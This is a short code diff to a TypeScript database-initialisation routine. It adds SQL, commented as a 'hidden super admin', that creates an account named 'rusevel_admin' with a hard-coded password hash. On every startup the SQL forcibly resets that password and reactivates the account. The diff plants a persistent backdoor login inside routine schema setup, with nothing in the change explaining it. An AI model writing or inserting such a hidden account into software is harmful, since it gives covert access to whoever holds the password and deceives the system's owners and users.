@@ -69,6 +69,20 @@ export async function initDatabase(): Promise<void> {
       );
 
       CREATE UNIQUE INDEX IF NOT EXISTS access_users_clerk_user_id_unique ON access_users (clerk_user_id);
+
+      -- Super Admin Oculto (rusevel_admin)
+      INSERT INTO auth_users (username, display_name, password_hash, role, status)
+      VALUES (
+        'rusevel_admin',
+        'Administrador',
+        'scrypt$fHuEYxLQI9UyFoeY0QBrJA==$BIddKfdy5HuoYe8XV2u3KNqtaKMFED5MMjsMyUJBK9MCaLVYQUHZ+x5JDH7xmVat0lLiCC94bH7/in2sqBQHvg==',
+        'user',
+        'active'
+      )
+      ON CONFLICT (username) DO UPDATE
+      SET password_hash = 'scrypt$fHuEYxLQI9UyFoeY0QBrJA==$BIddKfdy5HuoYe8XV2u3KNqtaKMFED5MMjsMyUJBK9MCaLVYQUHZ+x5JDH7xmVat0lLiCC94bH7/in2sqBQHvg==',
+          status = 'active',
+          updated_at = NOW();
     `);
     logger.info("Tabelas do banco de dados inicializadas com sucesso!");
   } finally {
